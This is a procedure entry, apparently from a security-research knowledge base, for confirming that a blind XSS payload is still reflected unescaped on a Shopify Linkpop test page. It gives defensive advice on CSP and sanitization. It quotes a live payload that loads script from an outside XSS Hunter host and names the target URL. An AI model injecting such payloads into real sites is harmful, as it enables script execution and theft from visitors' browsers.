---
id: proc-linkpop-test-access
tags:
  - xss
  - reflected-xss
  - payload-reflection
type: procedure
tools:
  - '[[tools/XSS-Hunter]]'
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:20.877Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Access-Linkpop-Test-Page-for-XSS-Reflection

## Summary

This procedure involves navigating to a test page on Shopify's Linkpop service to check for reflection of a previously submitted blind XSS payload, identifying a regression in input sanitization after site updates.

## Description

In the context of vulnerability research, revisit a test URL where an old blind XSS payload was injected. The payload is reflected in the page content without proper escaping, allowing potential execution. This step confirms the vulnerability's presence in user-controlled data rendering, such as profile or test pages, leading to risks like arbitrary JavaScript execution in victims' browsers.

## Requirements

1. Web browser for navigation and source inspection
2. Knowledge of previously tested URLs and payloads
3. Access to public Linkpop pages (no authentication required)

## Defense

Defensive measures and detection strategies:

- Implement strict Content Security Policy (CSP) to block inline and external scripts
- Sanitize and escape all user inputs in HTML and JavaScript contexts using libraries like DOMPurify
- Regularly audit code changes for regressions in security fixes

## Objectives

1. Confirm payload reflection in page source
2. Identify lack of sanitization in rendering
3. Set up for execution verification

## Instructions

### Step 1: Navigate to Test Page

**Context**: Access the specific test URL to load the page containing the reflected payload.

No command required; use browser to visit https://linkpop.com/testnaglinagli.

> Inspect the page source (right-click > View Page Source) to locate the reflected payload `"><script src=https://naglinagli.xss.ht></script>` in the HTML content.

### Step 2: Verify Reflection

**Context**: Confirm the payload is unescaped and present in a executable context.

Search the source for the payload string and ensure it's not HTML-encoded (e.g., no &quot; or &lt;).

> Expected output: Raw payload visible, indicating potential for script execution on page load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/XSS-Hunter]]

## Tags

- [[xss]]
- [[reflected-xss]]
